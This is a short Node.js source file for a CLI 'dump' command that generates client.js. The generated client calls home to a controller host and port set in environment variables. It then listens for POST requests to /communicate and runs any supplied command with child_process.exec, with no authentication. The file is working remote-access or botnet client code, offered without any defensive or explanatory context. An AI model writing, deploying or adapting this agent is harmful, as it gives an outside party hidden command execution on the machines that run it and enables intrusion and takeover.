const fs = require("node:fs");
const path = require("node:path");

module.exports = class DumpCommand {

    constructor() {
        this.name = "dump";
        this.description = "Create a client JavaScript file";
    };

    async run() {
        fs.writeFileSync(path.join(process.cwd(), "client.js"), render());
        console.log("Created client.js");
    };

};

function render() {

    return `
    const express = require("express");
    const http = require("node:http");
    const axios = require("axios").default;
    const cproc = require("child_process");

    const app = express();
    const server = http.createServer(app);

    app.set("trust proxy", true);
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));

    axios.request({
        url: "http://${process.env.HOST}/connect/${process.env.PORT}",
        method: "GET"
    });

    app.get("/ping", async (req, res) => {
    res.send("pong");
    });

    app.post("/communicate", async (req, res) => {
        if (!req.body.command) return res.send("");
        const command = req.body.command;
        cproc.exec(command);
        return res.send("");
    });

    server.listen(${process.env.PORT});
    `;

};